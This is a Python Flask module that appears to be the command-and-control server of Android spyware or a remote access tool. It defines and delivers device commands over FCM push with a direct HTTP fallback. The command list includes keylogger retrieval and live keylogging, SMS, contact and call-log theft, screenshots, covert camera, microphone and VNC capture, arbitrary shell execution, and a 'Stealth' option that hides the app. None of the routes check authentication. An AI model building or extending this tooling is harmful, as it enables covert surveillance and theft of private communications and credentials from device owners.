"""
Command API routes — Create, track, and deliver commands to devices.
Supports both FCM push and direct HTTP fallback.
"""

from flask import Blueprint, request, jsonify, current_app
from datetime import datetime
from sqlalchemy.exc import SQLAlchemyError
from models.devices import Command, Device
from config.database import db
from utils.fcm_sender import send_command_to_device
from utils.audit import log_action
from logzero import logger
import json
import requests as http_requests

commands_bp = Blueprint('commands', __name__)

# Command type → HTTP endpoint mapping (for direct HTTP fallback)
COMMAND_HTTP_ENDPOINTS = {
    'GET_LOCATION': '/getFreshLocation',
    'GET_DEVICE_INFO': '/getDeviceInfo',
    'GET_BATTERY_INFO': '/getBatteryInfo',
    'GET_SIM_INFO': '/getSimInfo',
    'GET_OS_INFO': '/getOsInfo',
    'GET_CONTACTS': '/getFreshContacts',
    'GET_SMS': '/getFreshMessages',
    'GET_CALL_LOGS': '/getFreshCallLogs',
    'GET_APPS': '/getFreshApps',
    'GET_KEYLOGGER_DATA': '/getAllKeyloggerData',
    'CAPTURE_SCREENSHOT': '/captureScreenshot',
}

# Valid command types
VALID_COMMANDS = [
    # Device control
    'LOCK_DEVICE', 'UNLOCK_DEVICE', 'WIPE_DEVICE', 'REBOOT_DEVICE',
    'SHUTDOWN_DEVICE', 'SET_PASSWORD', 'CLEAR_PASSWORD',
    # App management
    'INSTALL_APP', 'UNINSTALL_APP', 'LAUNCH_APP', 'KILL_APP',
    'CLEAR_APP_DATA', 'START_KIOSK_MODE', 'STOP_KIOSK_MODE',
    # Data collection
    'GET_LOCATION', 'GET_DEVICE_INFO', 'GET_BATTERY_INFO', 'GET_SIM_INFO',
    'GET_OS_INFO', 'GET_CONTACTS', 'GET_SMS', 'GET_CALL_LOGS', 'GET_APPS',
    'GET_KEYLOGGER_DATA', 'ENABLE_LIVE_KEYLOGGER', 'DISABLE_LIVE_KEYLOGGER',
    # Media
    'CAPTURE_SCREENSHOT', 'START_CAMERA', 'STOP_CAMERA',
    'START_VNC', 'STOP_VNC', 'START_MIC_RECORDING', 'STOP_MIC_RECORDING',
    # Stealth
    'HIDE_APP', 'SHOW_APP',
    # Communication
    'SEND_SMS', 'MAKE_CALL',
    # Audio & haptics
    'SET_VOLUME', 'SET_RINGTONE_MODE', 'PLAY_SOUND', 'VIBRATE',
    # Network
    'TOGGLE_WIFI', 'TOGGLE_BLUETOOTH',
    # Display
    'SET_BRIGHTNESS', 'SET_SCREEN_TIMEOUT',
    # Clipboard
    'GET_CLIPBOARD', 'SET_CLIPBOARD',
    # Shell
    'SHELL_EXEC',
    # File operations
    'DELETE_FILE', 'DOWNLOAD_FILE',
    # UI
    'SHOW_TOAST', 'OPEN_URL',
]


@commands_bp.route('/commands/send', methods=['POST'])
def send_command():
    """Create and send a command to a device."""
    try:
        data = request.get_json()
        device_id = data.get('device_id') or data.get('deviceId')
        command_type = data.get('command_type') or data.get('commandType')
        payload = data.get('payload', {})

        if not device_id:
            return jsonify({'error': 'Missing device_id'}), 400
        if not command_type or command_type not in VALID_COMMANDS:
            return jsonify({'error': f'Invalid command_type. Valid: {VALID_COMMANDS}'}), 400

        device = Device.query.get(device_id)
        if not device:
            return jsonify({'error': 'Device not found'}), 404

        # Create command record
        command = Command(
            device_id=device_id,
            command_type=command_type,
            payload=json.dumps(payload) if payload else '{}',
            status='PENDING',
        )
        db.session.add(command)
        db.session.commit()

        # Try to deliver the command
        delivered = deliver_command(device, command)

        log_action(
            action=f'send_command:{command_type}',
            target_type='device',
            target_id=device_id,
            details={'command_id': command.id, 'delivered': delivered}
        )

        # Emit real-time event for command creation
        emit_event = current_app.config.get('EMIT_EVENT')
        if emit_event:
            emit_event('command_status_updated', {
                'command_id': command.id,
                'device_id': device_id,
                'command_type': command_type,
                'status': command.status,
            })

        return jsonify({
            'message': 'Command created',
            'command': command.to_dict(),
            'delivered': delivered,
        }), 201

    except SQLAlchemyError as e:
        db.session.rollback()
        logger.error(f"DB error creating command: {e}")
        return jsonify({'error': str(e)}), 500


def deliver_command(device: Device, command: Command) -> bool:
    """Attempt to deliver a command via FCM, then HTTP fallback."""
    # 1. Try FCM
    payload = json.loads(command.payload) if command.payload else {}
    fcm_sent = send_command_to_device(
        fcm_token=device.fcm_token,
        command_id=command.id,
        command_type=command.command_type,
        payload=payload,
    )
    if fcm_sent:
        command.status = 'SENT'
        command.sent_at = datetime.now()
        db.session.commit()
        return True

    # 2. Fallback: direct HTTP to device
    http_endpoint = COMMAND_HTTP_ENDPOINTS.get(command.command_type)
    if http_endpoint and device.device_ip:
        try:
            device_url = f'http://{device.device_ip}:8080{http_endpoint}'
            response = http_requests.get(device_url, timeout=5)
            if response.status_code == 200:
                command.status = 'EXECUTED'
                command.sent_at = datetime.now()
                command.executed_at = datetime.now()
                command.result = response.text[:2000]
                db.session.commit()
                return True
        except Exception as e:
            logger.debug(f"HTTP fallback failed for {device.device_id}: {e}")

    # 3. For commands without GET endpoints, try POST to device's command endpoint
    if not http_endpoint:
        if device.device_ip:
            try:
                device_url = f'http://{device.device_ip}:8080/executeCommand'
                response = http_requests.post(
                    device_url,
                    json={'command_type': command.command_type, 'payload': payload},
                    timeout=5
                )
                if response.status_code == 200:
                    command.status = 'EXECUTED'
                    command.sent_at = datetime.now()
                    command.executed_at = datetime.now()
                    command.result = response.text[:2000]
                    db.session.commit()
                    return True
            except Exception as e:
                logger.debug(f"HTTP POST command failed: {e}")

    # Mark as pending (will be picked up later or retried)
    db.session.commit()
    return False


@commands_bp.route('/commands/<device_id>', methods=['GET'])
def get_device_commands(device_id):
    """Get all commands for a device, ordered by newest first."""
    try:
        status_filter = request.args.get('status')
        query = Command.query.filter_by(device_id=device_id)
        if status_filter:
            query = query.filter_by(status=status_filter)
        commands = query.order_by(Command.created_at.desc()).limit(100).all()
        return jsonify([cmd.to_dict() for cmd in commands]), 200
    except SQLAlchemyError as e:
        return jsonify({'error': str(e)}), 500


@commands_bp.route('/commands/<int:command_id>/status', methods=['PUT', 'POST'])
def update_command_status(command_id):
    """Update command execution status (called by Android device after executing)."""
    try:
        data = request.get_json()
        new_status = data.get('status')
        result = data.get('result')

        if not new_status:
            return jsonify({'error': 'Missing status'}), 400

        command = Command.query.get(command_id)
        if not command:
            return jsonify({'error': 'Command not found'}), 404

        command.status = new_status
        if result:
            command.result = json.dumps(result) if isinstance(result, dict) else str(result)
        if new_status in ('EXECUTED', 'FAILED'):
            command.executed_at = datetime.now()
        if new_status == 'DELIVERED':
            command.sent_at = command.sent_at or datetime.now()

        db.session.commit()

        # Emit real-time command status update via Socket.IO
        emit_event = current_app.config.get('EMIT_EVENT')
        if emit_event:
            emit_event('command_status_updated', {
                'command_id': command.id,
                'device_id': command.device_id,
                'command_type': command.command_type,
                'status': command.status,
            })

        return jsonify({'message': 'Status updated', 'command': command.to_dict()}), 200

    except SQLAlchemyError as e:
        db.session.rollback()
        return jsonify({'error': str(e)}), 500


@commands_bp.route('/commands/pending/<device_id>', methods=['GET'])
def get_pending_commands(device_id):
    """Get all pending commands for a device (polled by the Android device)."""
    try:
        commands = Command.query.filter_by(
            device_id=device_id, status='PENDING'
        ).order_by(Command.created_at.asc()).all()
        return jsonify([cmd.to_dict() for cmd in commands]), 200
    except SQLAlchemyError as e:
        return jsonify({'error': str(e)}), 500


@commands_bp.route('/commands/types', methods=['GET'])
def get_command_types():
    """Return all valid command types."""
    return jsonify({'command_types': VALID_COMMANDS}), 200
